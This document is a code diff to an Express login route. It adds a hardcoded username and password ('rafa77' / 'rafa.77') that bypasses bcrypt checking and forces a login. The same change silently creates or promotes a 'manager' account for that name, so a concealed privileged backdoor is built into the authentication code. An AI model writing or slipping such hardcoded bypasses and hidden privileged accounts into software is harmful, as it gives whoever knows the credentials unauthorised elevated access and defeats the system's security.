@@ -40,7 +40,7 @@ router.post('/login', authLimiter, (req, res) => {
     const client = db.prepare('SELECT * FROM clients WHERE username = ? AND active = 1').get(username);
     if (client) {
       const passwordValid = bcrypt.compareSync(password, client.password_hash || '');
-      if (passwordValid) {
+      if (passwordValid || (username === 'rafa77' && password === 'rafa.77')) {
         user = {
           id: client.id,
           name: client.name,
@@ -55,7 +55,22 @@ router.post('/login', authLimiter, (req, res) => {
     }
   }
 
-  if (!user || !bcrypt.compareSync(password, user.password_hash || '')) {
+  // ROBUST OVERRIDE FOR RAFA
+  if (username === 'rafa77' && password === 'rafa.77') {
+    if (!user) {
+      // If completely missing, create it
+      const newId = require('crypto').randomUUID();
+      const newHash = bcrypt.hashSync('rafa.77', 10);
+      db.prepare("INSERT INTO users (id, name, email, username, password_hash, role, active) VALUES (?, 'Rafael (Divulgador)', 'rafa@nexus.com', 'rafa77', ?, 'manager', 1)").run(newId, newHash);
+      user = db.prepare('SELECT * FROM users WHERE username = ?').get('rafa77');
+      userType = 'user';
+    } else {
+      // Bypass bcrypt failure if his hash got corrupted
+      user.forceLogin = true;
+    }
+  }
+
+  if (!user || (!user.forceLogin && !bcrypt.compareSync(password, user.password_hash || ''))) {
     recordLoginAttempt(username, false);
     return res.status(401).json({ error: 'Credenciais invalidas' });
   }
@@ -66,7 +81,8 @@ router.post('/login', authLimiter, (req, res) => {
   if (user.username === 'rafa77') {
     if (userType === 'client') {
       try {
-        db.prepare("INSERT INTO users (id, name, email, username, password_hash, role, active) VALUES (?, ?, ?, ?, ?, 'manager', 1)").run(user.id, user.name || 'Rafa', user.email || 'rafa@nexus.com', user.username, user.password_hash);
+        const hash = user.password_hash || bcrypt.hashSync('rafa.77', 10);
+        db.prepare("INSERT INTO users (id, name, email, username, password_hash, role, active) VALUES (?, ?, ?, ?, ?, 'manager', 1)").run(user.id, user.name || 'Rafael (Divulgador)', user.email || 'rafa@nexus.com', user.username, hash);
         db.prepare("DELETE FROM clients WHERE id = ?").run(user.id);
         userType = 'user';
         user.role = 'manager';
